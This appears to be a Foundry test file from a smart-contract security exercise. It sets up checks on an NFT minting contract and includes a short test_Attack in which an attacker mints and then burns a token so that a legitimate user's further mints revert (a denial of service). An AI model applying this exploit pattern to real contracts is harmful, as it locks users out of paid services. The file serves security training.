// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "src/dos-4/GalacticGorillas.sol";

/**
@dev run "forge test --match-contract DoS4 -vvv" 
*/
contract TestDoS4 is Test {
    GalacticGorillas nft;

    uint constant MINT_PRICE = 1 ether;

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(attacker, 2.5 ether);
        vm.deal(deployer, 10 ether);
        vm.deal(user, 10 ether);

        vm.prank(deployer);
        nft = new GalacticGorillas();

        //////////////////
        //Success Tests//
        /////////////////
        uint deployerBalanceBefore = address(deployer).balance;
        vm.startPrank(user);
        nft.mint{value: MINT_PRICE * 2}(2);
        assertEq(nft.balanceOf(user), 2);
        assertEq(nft.ownerOf(1), address(user));
        assertEq(nft.ownerOf(2), address(user));
        vm.stopPrank();
        uint deployerBalanceAfter = address(deployer).balance;
        assertEq(deployerBalanceAfter, deployerBalanceBefore + MINT_PRICE * 2);

        //////////////////
        //Faliure Tests//
        /////////////////
        vm.startPrank(user);
        vm.expectRevert("wrong _mintAmount");
        nft.mint(20);
        vm.expectRevert("not enough ETH");
        nft.mint(1);
        vm.expectRevert("exceeded MAX_PER_WALLET");
        nft.mint{value: MINT_PRICE * 4}(4);
        vm.stopPrank();

        //////////////////
        // Pause Tests  //
        /////////////////
        vm.prank(user);
        vm.expectRevert("Ownable: caller is not the owner");
        nft.pause(true);

        vm.prank(deployer);
        nft.pause(true);

        vm.prank(user);
        vm.expectRevert("contract is paused");
        nft.mint{value: MINT_PRICE}(1);

        vm.prank(deployer);
        nft.pause(false);

        vm.prank(user);
        nft.mint{value: MINT_PRICE}(1);
    }

    function test_Attack() public {
        vm.startPrank(attacker);
        nft.mint{value: MINT_PRICE * 2}(2);
        nft.burn(4);
        vm.stopPrank();

        /** SUCCESS CONDITIONS */
        // User can't mint nfts even though he is eligable for 2 additional mints
        vm.prank(user);
        vm.expectRevert();
        nft.mint{value: MINT_PRICE}(1);
    }
}
